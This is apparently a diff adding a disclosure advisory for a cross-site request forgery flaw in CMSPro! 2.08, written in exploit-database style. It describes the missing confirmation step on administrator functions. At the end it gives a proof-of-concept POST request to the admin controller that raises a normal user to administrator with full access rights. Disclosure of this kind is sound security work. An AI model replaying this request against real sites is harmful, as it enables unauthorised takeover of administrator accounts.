@@ -1,0 +1,35 @@
+CMSPro! 2.08 CSRF Vulnerability
+# Title : CMSPro! 2.08  Cross Site Request Forgery (CSRF) Vulnerability
+# Software : CMSPro!
+# Version :  2.08
+# Site : http://www.wojoscripts.com/cmspro/ or
+http://codecanyon.net/item/cms-pro-lightweight-content-management-system/140078
+# Author : Xadpritox
+# Email : xadpritox@whitehatmail.com
+# site : http://hacker-cisadane.org
+# Type : Cross Site Request Forgery (CSRF) Vulnerability
+
+
+VULNERABILITY DESCRIPTION
+CMSPro! 2.08 versions contain a flaw that allows a remote Cross-site Request
+Forgery (CSRF) attack. The flaw exists because the application does not
+require multiple steps or explicit confirmation for sensitive transactions
+for majority of administrator functions such as delete , assigning user to
+administrative privilege. By using a crafted URL, an attacker may trick the
+victim into visiting to his web page to take advantage of the trust
+relationship between the authenticated victim and the application. Such an
+attack could trick the victim into executing arbitrary commands in the
+context of their session with the application, without further prompting or
+verification.
+
+
+VERSIONS AFFECTED
+CMSPro! 2.08
+
+
+PROOF-OF-CONCEPT/EXPLOIT
+The following request escalates a normal user to an administrator.
+
+POST /cmspro/admin/controller.php password=&email=xadpritox%
+40whitehatmail.com
+&fname=Xadpritox&lname=Xadpritox&membership_id=4&userlevel=9&access%5B%5D=Menus&access%5B%5D=Pages&access%5B%5D=Posts&access%5B%5D=Modules&access%5B%5D=Rss&access%5B%5D=Layout&access%5B%5D=Configuration&active=y&newsletter=0&submit=Update+User&username=Xadpritox&userid=5&processUser=1
